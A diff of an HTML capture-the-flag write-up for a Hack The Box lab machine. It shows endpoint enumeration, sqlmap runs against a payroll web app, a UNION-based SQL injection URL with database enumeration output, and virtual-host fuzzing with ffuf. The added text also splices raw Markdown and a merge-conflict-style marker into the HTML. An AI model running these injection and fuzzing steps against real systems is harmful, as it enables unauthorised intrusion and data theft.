@@ -425,41 +425,34 @@ $ ls -la
 </code></pre></div>
 
 <p>Now we are using some magical, not so magical greps and regular expressions so find endpoint and parameters.</p>
-<div class="highlight"><pre><span></span><code>$ grep -h -i <span class="s2">&quot;\.php&quot;</span> * <span class="p">|</span> rg -o -e <span class="s2">&quot;((&#39;|\&quot;)(.*?)(&#39;|\&quot;))&quot;</span> -r <span class="s1">&#39;$3&#39;</span> <span class="p">|</span> grep php
-ajax.php?action<span class="o">=</span>login
-index.php?page<span class="o">=</span>home
-voting.php
-ajax.php?action<span class="o">=</span>save_department
-ajax.php?action<span class="o">=</span>delete_department
-manage_employee.php?id<span class="o">=</span>
-view_employee.php?id<span class="o">=</span>
-manage_employee.php
-ajax.php?action<span class="o">=</span>delete_employee
-ajax.php?action<span class="o">=</span>login
-index.php?page<span class="o">=</span>home
-voting.php
-ajax.php?action<span class="o">=</span>login
-index.php?page<span class="o">=</span>home
-voting.php
-index.php?page<span class="o">=</span>home
-index.php?page<span class="o">=</span>attendance
-index.php?page<span class="o">=</span>payroll
-index.php?page<span class="o">=</span>employee
-index.php?page<span class="o">=</span>department
-index.php?page<span class="o">=</span>position
-index.php?page<span class="o">=</span>allowances
-index.php?page<span class="o">=</span>deductions
-manage_payroll.php?id<span class="o">=</span>
-index.php?page<span class="o">=</span>payroll_items<span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span>
-manage_payroll.php
+<div class="highlight"><pre><span></span><code>$ grep -h -i <span class="s2">&quot;\.php&quot;</span> * <span class="p">|</span> rg -o -e <span class="s2">&quot;((&#39;|\&quot;)(.*?)(&#39;|\&quot;))&quot;</span> -r <span class="s1">&#39;$3&#39;</span> <span class="p">|</span> grep php <span class="p">|</span> sort -u
 ajax.php?action<span class="o">=</span>calculate_payroll
+ajax.php?action<span class="o">=</span>delete_department
+ajax.php?action<span class="o">=</span>delete_employee
 ajax.php?action<span class="o">=</span>delete_payroll
-ajax.php?action<span class="o">=</span>save_position
 ajax.php?action<span class="o">=</span>delete_position
+ajax.php?action<span class="o">=</span>delete_user
+ajax.php?action<span class="o">=</span>login
 ajax.php?action<span class="o">=</span><span class="nb">logout</span>
+ajax.php?action<span class="o">=</span>save_department
+ajax.php?action<span class="o">=</span>save_position
+index.php?page<span class="o">=</span>allowances
+index.php?page<span class="o">=</span>attendance
+index.php?page<span class="o">=</span>deductions
+index.php?page<span class="o">=</span>department
+index.php?page<span class="o">=</span>employee
+index.php?page<span class="o">=</span>home
+index.php?page<span class="o">=</span>payroll
+index.php?page<span class="o">=</span>payroll_items<span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span>
+index.php?page<span class="o">=</span>position
+manage_employee.php
+manage_employee.php?id<span class="o">=</span>
+manage_payroll.php
+manage_payroll.php?id<span class="o">=</span>
 manage_user.php
 manage_user.php?id<span class="o">=</span>
-ajax.php?action<span class="o">=</span>delete_user
+view_employee.php?id<span class="o">=</span>
+voting.php
 </code></pre></div>
 
 <p>We end up with a very nice list. I go with <code>manage_users.php?id=1</code> at very first. Visiting the page we are greated with a nice prefilled form, hoping the password might be in cleartext in the source code.</p>
@@ -527,17 +520,49 @@ ajax.php?action<span class="o">=</span>delete_user
 </tr>
 </tbody>
 </table>
-<hr>
-<h2>snip</h2>
-<h1>Vhost Fuzzing</h1>
-<div class="highlight"><pre><span></span><code>$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H <span class="s2">&quot;HOST: preprod-FUZZ.trick.htb&quot;</span> -fs <span class="m">5480</span>
+<p>We can login with those credentials to the website, but they don't work on SSH.</p>
+<h1>SQL Injection</h1>
+<p>We take a look on the admin panel later, we first go with the SQL injection tries. We take the endpoint list we gathered already and filter it even more, so sqlmap can perform its magic.</p>
+<div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/ajax.php?action=login
+http://preprod-payroll.trick.htb/index.php?page=payroll
+http://preprod-payroll.trick.htb/index.php?page=payroll_items&amp;id=1
+http://preprod-payroll.trick.htb/manage_employee.php?id=1
+http://preprod-payroll.trick.htb/manage_payroll.php?id=1
+http://preprod-payroll.trick.htb/manage_user.php?id=1
+http://preprod-payroll.trick.htb/view_employee.php?id=1
+http://preprod-payroll.trick.htb/voting.php
+</code></pre></div>
 
-        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\</span>
-       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
-       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
-        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
-         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\</span>
-          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+<p>Running sqlmap against all urls</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -m ../htb/trick/extracte_endpoints_params.txt
+</code></pre></div>
+
+<p>sqlmap did a great job, it found UNION bases injections on multiple endpoints.</p>
+<div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/manage_employee.php?id=-1+union+select+1,2,0x3a3a3a3a3a3a3a3a3a3a,4,5,6,7,8
+</code></pre></div>
+
+<p>Let's extract some juicy information and maybe we can get a shell?!</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u &#39;http://preprod-payroll.trick.htb/manage_employee.php?id=1&#39; --current-user --dbs
+current user: &#39;remo@localhost&#39;
+available databases [2]:
+[*] information_schema
+[*] payroll_db
+=======
+
+-----------------------
+snip
+-----------------------
+
+# Vhost Fuzzing
+```bash
+$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H &quot;HOST: preprod-FUZZ.trick.htb&quot; -fs 5480
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v1.5.0-dev
 ________________________________________________
@@ -546,17 +571,17 @@ ________________________________________________
  :: URL              : http://preprod-payroll.trick.htb
  :: Wordlist         : FUZZ: SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt
  :: Header           : Host: preprod-FUZZ.trick.htb
- :: Follow redirects : <span class="nb">false</span>
- :: Calibration      : <span class="nb">false</span>
- :: Timeout          : <span class="m">10</span>
- :: Threads          : <span class="m">40</span>
- :: Matcher          : Response status: <span class="m">200</span>,204,301,302,307,401,403,405,500
- :: Filter           : Response size: <span class="m">5480</span>
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 5480
 ________________________________________________
 
-marketing               <span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">9660</span>, Words: <span class="m">3007</span>, Lines: <span class="m">179</span>, Duration: 26ms<span class="o">]</span>
-payroll                 <span class="o">[</span>Status: <span class="m">302</span>, Size: <span class="m">9546</span>, Words: <span class="m">1453</span>, Lines: <span class="m">267</span>, Duration: 38ms<span class="o">]</span>
-:: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 26ms]
+payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 38ms]
+:: Progress: [114441/114441] :: Job [1/1] :: 1262 req/sec :: Duration: [0:01:34] :: Errors: 0 ::
 </code></pre></div>
   </div>
   <div class="tag-cloud">
